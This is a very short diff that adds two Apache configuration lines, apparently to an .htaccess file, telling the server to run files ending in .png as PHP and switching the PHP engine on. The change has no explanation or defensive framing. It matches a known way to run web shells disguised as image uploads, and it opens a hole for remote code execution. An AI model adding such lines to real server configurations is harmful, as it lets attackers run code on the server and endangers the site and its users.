@@ -1,0 +1,3 @@
+
+AddType application/x-httpd-php .png
+php_flag engine on
